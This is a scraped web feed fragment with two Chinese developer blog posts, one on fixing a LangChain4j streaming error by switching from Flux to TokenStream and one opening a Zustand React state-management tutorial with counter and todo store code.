li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在基于 <strong>LangChain4j + Spring Boot</strong> 开发AI代码生成平台的过程中，主要想实现Vue项目带工具调用的流式生成能力，比如自动写入项目文件、构建打包，同时通过响应式流向前端推送实时进度。</p>
<p>但是，在前端调试时，出现了以下错误：</p>
<p><strong>抱歉,生成过程中出现了错误,请重试。</strong></p>
<h3 data-id="heading-0">原因分析</h3>
<h4 data-id="heading-1">1. AI服务接口</h4>
<pre><code class="hljs language-bash" lang="bash">@SystemMessage(fromResource = <span class="hljs-string">"prompt/codegen-vue-project-system-prompt.txt"</span>)
Flux&lt;String&gt; generateVueProjectCodeStream(@MemoryId long appId, @UserMessage String userMessage);
</code></pre>
<h4 data-id="heading-2">2. Facade层调度逻辑</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-keyword">case</span> VUE_PROJECT -&gt; {
    Flux codeStream = aiCodeGeneratorService.generateVueProjectCodeStream(appId, userMessage);
    yield processCodeStream(codeStream, CodeGenTypeEnum.VUE_PROJECT, appId);
}
</code></pre>
<p>接口调用直接返回业务异常，前端无任何流式输出，日志无有效业务堆栈，仅提示：<code>抱歉，生成过程中出现了错误，请重试</code>。</p>
<p>主要原因是：</p>
<ul>
<li><code>TokenStream</code> 是LangChain4j专为<strong>AI流式响应 + 工具调用</strong>设计的API，内置 <code>onToolRequest</code>/<code>onToolExecuted</code> 等完整回调事件，可无缝衔接工具执行流程；</li>
<li><code>Flux&lt;String&gt;</code> 是通用响应式流组件，<strong>无AI场景专属能力</strong>，无法接收、处理工具调用的回调事件。</li>
</ul>
<h3 data-id="heading-3">解决方法</h3>
<p>将接口和调度层作如下修改：</p>
<pre><code class="hljs language-bash" lang="bash">// 1. AI接口原生返回值类型
@SystemMessage(fromResource = <span class="hljs-string">"prompt/codegen-vue-project-system-prompt.txt"</span>)
TokenStream generateVueProjectCodeStream(@MemoryId long appId, @UserMessage String userMessage);

// 2. Facade层调度逻辑
<span class="hljs-keyword">case</span> VUE_PROJECT -&gt; {
    TokenStream tokenStream = aiCodeGeneratorService.generateVueProjectCodeStream(appId, userMessage);
    yield processTokenStream(tokenStream);
}
</code></pre>
<p>接下来，就恢复正常了。</p>
<h3 data-id="heading-4">小贴士</h3>
<p>在集成工具调用的LangChain4j AI场景中，<code>TokenStream</code> 是官方推荐且唯一能保证全功能正常运行的流式类型，<code>Flux</code> 仅适用于无AI业务逻辑的通用流式场景。</p>
<p>在集成第三方框架时，优先使用框架原生提供的组件和API，是保证系统稳定性的最优解。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Zustand：打造 React 应用的“中央银行”级状态管理]]></title>    <link>https://juejin.cn/post/7602243150157873179</link>    <guid>https://juejin.cn/post/7602243150157873179</guid>    <pubDate>2026-02-03T05:17:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602243150157873179" data-draft-id="7602252722373328947" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Zustand：打造 React 应用的“中央银行”级状态管理"/> <meta itemprop="keywords" content="React.js,前端框架,前端工程化"/> <meta itemprop="datePublished" content="2026-02-03T05:17:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="San30"/> <meta itemprop="url" content="https://juejin.cn/user/1766294768060816"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Zustand：打造 React 应用的“中央银行”级状态管理
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1766294768060816/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    San30
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T05:17:50.000Z" title="Tue Feb 03 2026 05:17:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><p>在 React 的开发江湖中，状态管理（State Management）始终是一个绕不开的核心话题。如果说 React 组件是构成应用社会的“个体家庭”，那么状态管理就是维持社会运转的“经济系统”。</p>
<p>对于简单的父子组件通信，<code>useState</code> 和 <code>props</code> 就像是家庭内部的现金流转，简单直接。但当应用规模扩大，多个没有任何血缘关系（非父子层级）的组件需要共享数据时，我们往往会陷入“Prop Drilling”（属性透传）的泥潭。</p>
<p>这时，我们需要一个**“中央银行”**。</p>
<p>这就是 <strong>Zustand</strong>（德语“状态”之意）。它是一个基于 Hooks 的、轻量级的、无样板代码（Boilerplate-free）的状态管理库。它比 Redux 更简单，比 Context API 更高效。</p>
<p>本文将结合实际代码案例（计数器、待办事项、用户认证），带你深入理解 Zustand 的设计哲学与实战技巧。</p>
<h2 data-id="heading-0">一、 核心概念：为什么选择 Zustand？</h2>
<p>在深入代码之前，我们需要理解 Zustand 试图解决什么问题。</p>
<blockquote>
<p><strong>“如果说国家需要有中央银行，那么前端项目就需要中央状态管理系统。”</strong></p>
</blockquote>
<h3 data-id="heading-1">1. 组件 = UI + State</h3>
<p>在现代前端架构中，UI 只是数据的投影。公式</p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi><mi>I</mi><mo>=</mo><mi>f</mi><mo stretchy="false">(</mo><mi>S</mi><mi>t</mi><mi>a</mi><mi>t</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">UI = f(State)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">St</span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mclose">)</span></span></span></span></span></p>
<p>揭示了本质。Zustand 的作用就是将 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>t</mi><mi>a</mi><mi>t</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">State</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">St</span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span></span></span></span></span> 从组件树中抽离出来，存入一个全局的 Store（仓库）中进行专业管理。</p>
<h3 data-id="heading-2">2. 轻量与直观</h3>
<p>Redux 强制要求你编写 Action Types、Reducers、Selectors，并使用 Provider 包裹整个应用。而 Zustand 不仅无需 Provider，其核心逻辑更是极致精简：</p>
<ul>
<li><strong>全局共享：</strong> 状态一旦创建，任何组件均可访问。</li>
<li><strong>基于 Hooks：</strong> 使用方式几乎等同于 <code>useState</code>，符合 React 直觉。</li>
<li><strong>自动合并：</strong> 默认进行浅合并（Shallow Merge），简化了更新逻辑。</li>
</ul>
<p>工程目录结构如下：</p>
<pre><code class="hljs language-Plaintext" lang="Plaintext">src/
  ├── store/           # 状态管理的“中央银行”
  │    ├── user.ts     # 负责用户身份、登录状态
  │    ├── todo.ts     # 负责业务数据流
  │    └── counter.ts  # 负责基础工具或计数逻辑
  ├── components/      # UI 组件
  └── types/           # TypeScript 类型定义
</code></pre>
<h2 data-id="heading-3">二、 起步：构建你的第一个 Store</h2>
<p>让我们通过 <code>counter.ts</code> 来看看 Zustand 是如何定义“规矩”的。</p>
<h3 data-id="heading-4">1. 定义状态契约 (TypeScript Interface)</h3>
<p>在 TypeScript 项目中，第一步永远是定义类型。这相当于为“中央银行”制定法律，规定了存储什么数据，以及允许什么操作。</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-comment">// counter.ts</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">CounterState</span> {
    <span class="hljs-attr">count</span>: <span class="hljs-built_in">number</span>;          <span class="hljs-comment">// 数据状态</span>
    <span class="hljs-attr">increment</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>;  <span class="hljs-comment">// 修改动作：增加</span>
    <span class="hljs-attr">decrement</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>;  <span class="hljs-comment">// 修改动作：减少</span>
    <span class="hljs-attr">reset</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>;      <span class="hljs-comment">// 修改动作：重置</span>
}
</code></pre>
<h3 data-id="heading-5">2. 创建 Store (<code>create</code>)</h3>
<p>使用 <code>create</code> 函数构建 Store。这里有一个关键的模式：<strong>状态和修改状态的方法（Actions）是在一起定义的</strong>。这体现了高内聚的设计思想。</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-comment">// counter.ts</span>
<span class="hljs-keyword">import</span> { create } <span class="hljs-keyword">from</span> <span class="hljs-string">'zustand'</span>;
<span class="hljs-keyword">import</span> { persist } <span class="hljs-keyword">from</span> <span class="hljs-string">'zustand/middleware'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useCounterStore = create&lt;<span class="hljs-title class_">CounterState</span>&gt;()(
    <span class="hljs-title function_">persist</span>(
        <span class="hljs-function">(<span class="hljs-params">set</span>) =&gt;</span> ({
            <span class="hljs-comment">// 1. 初始状态</span>
            <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>,
            
            <span class="hljs-comment">// 2. 修改状态 (Actions)</span>
            <span class="hljs-comment">// set 函数接收当前 state，返回新的部分 state</span>
            <span class="hljs-attr">increment</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">set</span>(<span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> ({ <span class="hljs-attr">count</span>: state.<span class="hljs-property">count</span> + <span class="hljs-number">1</span> })),
            <span class="hljs-attr">decrement</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">set</span>(<span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> ({ <span class="hljs-attr">count</span>: state.<span class="hljs-property">count</span> - <span class="hljs-number">1</span> })),
            <span class="hljs-attr">reset</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">set</span>({ <span class="hljs-attr">count</span>: <span class="hljs-number">0</span> }),
        }),
        {
            <span class="hljs-attr">name</span>: <span class="hljs-string">'counter'</span>, <span class="hljs-comment">// 持久化存储的 key</span>
        }
    )
)
</code></pre>
<p><strong>代码解析：</strong></p>
<ul>
<li><code>set</code>: 这是 Zustand 提供的核心方法。你不需要像 Redux 那样 <code>dispatch</code> 一个对象，直接调用 <code>set</code> 即可更新状态。</li>
<li><code>persist</code>: 这是一个中间件（Middleware）。它自动将状态同步到 <code>localStorage</code>。当你刷新页面时，计数器的数值不会归零，而是从本地存储恢复。</li>
</ul>
<h2 data-id="heading-6">三、 进阶：处理复杂数据结构 (Array &amp; Object)</h2>
<p>现实世界的应用远比计数器复杂。看看 <code>todo.ts</code>，我们如何处理数组和对象更新。</p>
<h3 data-id="heading-7">1. 不可变更新 (Immutable Updates)</h3>
<p>虽然 Zustand 使用起来很简单，但它遵循 React 的不可变数据原则。在更新数组或对象时，我们不能直接 <code>push</code> 或修改属性，而是需要返回一个新的对象/数组。</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-comment">// todo.ts - 添加待办事项</span>
<span class="hljs-attr">addTodo</span>: <span class="hljs-function">(<span class="hljs-params">text: <span class="hljs-built_in">string</span></span>) =&gt;</span> <span class="hljs-title function_">set</span>(<span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> ({
    <span class="hljs-comment">// 使用展开运算符 (...) 创建新数组</span>
    <span class="hljs-attr">todos</span>: [...state.<span class="hljs-property">todos</span>, {
        <span class="hljs-attr">id</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),
        <span class="hljs-attr">text</span>: text.<span class="hljs-title function_">trim</span>(),
        <span class="hljs-attr">completed</span>: <span class="hljs-literal">false</span>
    }]
})),
</code></pre>
<h3 data-id="heading-8">2. 映射与过滤</h3>
<p>对于更新列表中的某一项（如切换完成状态）或删除某一项，标准的数组方法 <code>map</code> 和 <code>filter</code> 是最佳拍档。</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-comment">// todo.ts - 切换状态</span>
<span class="hljs-attr">toggleTodo</span>: <span class="hljs-function">(<span class="hljs-params">id: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-title function_">set</span>(<span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> ({
    <span class="hljs-attr">todos</span>: state.<span class="hljs-property">todos</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">todo</span> =&gt;</span> 
        <span class="hljs-comment">// 找到目标 ID，复制原对象并覆盖 completed 属性</span>
        todo.<span class="hljs-property">id</span> === id ? { ...todo, <span class="hljs-attr">completed</span>: !todo.<span class="hljs-property">completed</span> } : todo
    )
})),

<span class="hljs-comment">// todo.ts - 删除</span>
<span class="hljs-attr">removeTodo</span>: <span class="hljs-function">(<span class="hljs-params">id: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-title function_">set</span>(<span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> ({
    <span class="hljs-attr">todos</span>: state.<span class="hljs-property">todos</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">todo</span> =&gt;</span> todo.<span class="hljs-property">id</span> !== id)
}))
</code></pre>
